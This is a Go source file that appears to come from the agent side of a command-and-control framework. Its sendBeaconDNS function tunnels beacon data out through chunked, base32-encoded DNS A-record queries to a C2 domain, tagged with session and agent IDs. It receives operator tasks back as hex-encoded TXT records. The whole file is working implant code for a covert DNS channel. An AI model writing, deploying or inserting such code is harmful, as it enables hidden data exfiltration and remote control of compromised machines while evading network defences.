package agent

import (
	"crypto/rand"
	"encoding/base32"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"

	mdns "github.com/miekg/dns"
)

const (
	agentDNSChunkSize = 30   // must match server-side ChunkForDNS chunk size
	agentDNSUDPSize   = 4096 // enough for encrypted task TXT responses
)

// sendBeaconDNS transmits an encoded beacon over DNS and returns the server's encrypted response.
// Each chunk is base32-encoded and sent as a DNS A-record query.
// The server responds with the task in a TXT record on the final chunk.
func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
	chunks := chunkData(encoded)
	total := len(chunks)
	if total == 0 {
		return nil, fmt.Errorf("empty beacon payload")
	}

	domain := strings.TrimSuffix(c2Domain, ".")
	// Derive server address from domain. Send queries to port 53 of the C2 domain.
	serverAddr := net.JoinHostPort(domain, "53")

	client := &mdns.Client{Net: "udp", Timeout: 5 * time.Second, UDPSize: agentDNSUDPSize}
	sessionID, err := dnsSessionID()
	if err != nil {
		return nil, fmt.Errorf("generate DNS session ID: %w", err)
	}

	var respBytes []byte
	for i, chunk := range chunks {
		b32 := strings.ToLower(
			base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk),
		)
		// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<domain>.
		qname := fmt.Sprintf("%s.%04d.%04d.%s.%s.%s.", b32, i, total, sessionID, AgentID, domain)

		msg := new(mdns.Msg)
		msg.SetQuestion(qname, mdns.TypeA)
		msg.SetEdns0(agentDNSUDPSize, false)
		msg.RecursionDesired = false

		resp, _, err := client.Exchange(msg, serverAddr)
		if err != nil {
			return nil, fmt.Errorf("DNS exchange chunk %d: %w", i, err)
		}

		// The final chunk carries the hex-encoded TXT response.
		if i == total-1 {
			for _, rr := range resp.Answer {
				if txt, ok := rr.(*mdns.TXT); ok {
					decoded, err := hex.DecodeString(strings.Join(txt.Txt, ""))
					if err == nil {
						respBytes = append(respBytes, decoded...)
					}
				}
			}
		}
	}

	if len(respBytes) == 0 {
		return nil, fmt.Errorf("no TXT response received from DNS server")
	}
	return respBytes, nil
}

// chunkData splits data into agentDNSChunkSize-byte chunks.
func chunkData(data []byte) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		n := agentDNSChunkSize
		if n > len(data) {
			n = len(data)
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	return chunks
}

func dnsSessionID() (string, error) {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}
